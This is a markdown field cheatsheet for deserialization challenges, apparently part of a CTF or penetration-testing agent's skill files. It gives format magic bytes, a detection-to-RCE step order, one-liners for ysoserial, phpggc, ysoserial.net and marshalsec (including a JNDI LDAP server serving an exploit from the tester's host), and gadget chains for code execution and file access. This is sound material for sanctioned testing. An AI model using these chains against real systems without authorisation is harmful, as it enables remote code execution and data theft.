# Field Cheatsheet — deserialize challenge in two columns

## Format fingerprint — magic bytes at a glance

| Bytes (raw / b64) | Format | Module |
|---|---|---|
| `O:`/`a:`/`s:` / `Tzo`/`YToy` | PHP serialize | php-deser.md |
| `AC ED 00 05` / `rO0` | Java OIS | java-deser.md |
| `80 03`-`80 05` / `gAN`-`gAU` | pickle p3-5 | python-deser.md |
| `(`, `S`, `c`, `I` text / `(d` | pickle p0-2 | python-pickle-deep.md |
| `04 08` / `BAh` | Ruby Marshal | ruby-deser.md |
| `00 01 00 00 00 FF...` / `AAEAAAD` | .NET BinaryFormatter | dotnet-deser.md |
| `/wEP` | ASP.NET ViewState | dotnet-viewstate.md |
| `{"$type":` | Json.NET TypeNameHandling | dotnet-deser.md |
| `_$$ND_FUNC$$_` | node-serialize | nodejs-deser.md |
| `!!python/` / `!ruby/` / `!!javax` | YAML typed-tag | yaml-deser.md |
| `C7`-`C9` ext | msgpack typed ext | other-formats.md |
| `63`/`C` + binary | Hessian | other-formats.md |
| `<com.x.Class>` XML | XStream | other-formats.md |

## The prove-it order

```
1. decode the blob        → b64 | xxd | head -4
2. fingerprint the magic  → pick module
3. corrupt-and-diff       → parser error on your bytes = sink confirmed
4. marker / URLDNS        → callback or marker = gadget budget opens
5. fingerprint lib        → version → pick chain
6. gadget                 → RCE output / OOB flag
```

## Generator quick-table

| Format | Generator | One-liner |
|---|---|---|
| PHP POP | php_ser_gen | `--spec '{"O":"C","props":{}}'` |
| PHP phar | archive_gen | `phar --metadata '<ser>'` |
| PHP POP | phpgcc | `phpggc Chain/RCE1 system 'id' -b` |
| Java | ysoserial | `java -jar y.jar Chain 'id'` |
| .NET | ysoserial.net | `-g Gadget -f Fmt -c 'cmd /c id' -o base64` |
| pickle | pickle_gen | `--marker X` / `--cmd 'id'` / `--eval` |
| ViewState | ysoserial.net | `-p ViewState -g TextFormattingRunProperties --validationalg=SHA1 --validationkey=HEX ...` |
| JNDI | marshalsec | `LDAPRefServer http://YOU/#Exploit 1389` |
| JNDI | JNDIExploit | `-i YOU` (prints URLs) |

## The magic-method cheatsheet

| Lang | First hook | Second hook | Callable |
|---|---|---|---|
| PHP | `__wakeup`/`__destruct` | `__toString`/`__call` | `call_user_func`, `assert` |
| Java | `readObject`→`hashCode`/`equals`/`compare` | `readResolve`/`validateObject` | `Method.invoke` |
| Python | `REDUCE` (`__reduce__`) | `__setstate__` (`BUILD`) | any callable |
| .NET | `ISerializable` ctor | `OnDeserialized`/setters | `ObjectDataProvider.MethodName` |
| Ruby | `marshal_load`/`_load` | `method_missing`/`init_with` | `system`, `eval`, `ERB.result` |
| Node | `$$ND_FUNC$$` revive | `()` invoke | `child_process.exec` |

## Gadget → impact map (the pick-list)

| Want | PHP | Java | Python | .NET | Ruby |
|---|---|---|---|---|---|
| RCE | Monolog/Laravel/Symfony RCE | CC1-7, CBeanutils, Groovy | os.system/eval/subprocess | ActivitySurrogate/TypeConfuse | ERB-universal |
| file write | SwiftMailer/Guzzle FW | AspectJWeaver/FileUpload1 | open(path,'w') | ObjectDataProvider | file-write gadget |
| file read | Monolog FR | Rome/JDBC | open(path) | ObjectDataProvider | file-read gadget |
| OOB/detect | SoapClient | URLDNS | socket/dns | nslookup | resolve |
| JNDI | — | C3P0/JdbcRowSetImpl | — | — | — |

## The budget

```
fingerprint + corrupt-diff + marker  = "detection" mechanism class (5 probes)
one gadget family                    = that chain's class (5 probes)
25 probes / 45min total              → escalate per AGENTS.md ladder
```

## The falsifier card

```
identical response on valid+malformed  → no deserializer
allowed_classes=false + no phar        → PHP dead
safe_load + no permitted gadget        → YAML dead
TypeNameHandling.None + no ISerializable → Json.NET dead
signed + unleaked key + alg=none blocked → key problem not grammar
```
